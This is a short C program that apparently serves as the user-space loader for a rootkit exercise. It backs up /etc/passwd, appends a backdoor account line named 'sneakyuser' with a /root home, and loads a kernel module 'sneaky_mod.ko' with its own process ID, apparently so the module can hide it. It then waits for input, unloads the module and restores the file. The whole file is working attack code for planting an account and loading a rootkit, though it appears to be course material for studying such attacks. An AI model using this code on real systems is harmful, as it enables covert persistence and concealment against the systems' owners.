#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/wait.h>


int main()
{
    // get current pid(sudo?)
    int curPID = getpid();
    printf("sneaky_process pid = %d\n", curPID);

    // copy Password file to tmp dir
    system("cp /etc/passwd /tmp/passwd");

    // modify Password as required
    FILE *fp = fopen("/etc/passwd", "a");
    if (fp != NULL)
    {
        fprintf(fp, "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\n");
        fclose(fp);
    }

    // load
    char insmodCmd[256];
    sprintf(insmodCmd, "insmod sneaky_mod.ko sneakyPID=%d", curPID);
    system(insmodCmd);
    
    // wait for read q
    char input;
    do
    {
        input = getchar();
    } while (input != 'q');

    // unload and cleanup
    system("rmmod sneaky_mod.ko");

    // restore password file
    system("cp /tmp/passwd /etc/passwd");
    system("rm /tmp/passwd");

    return 0;
}
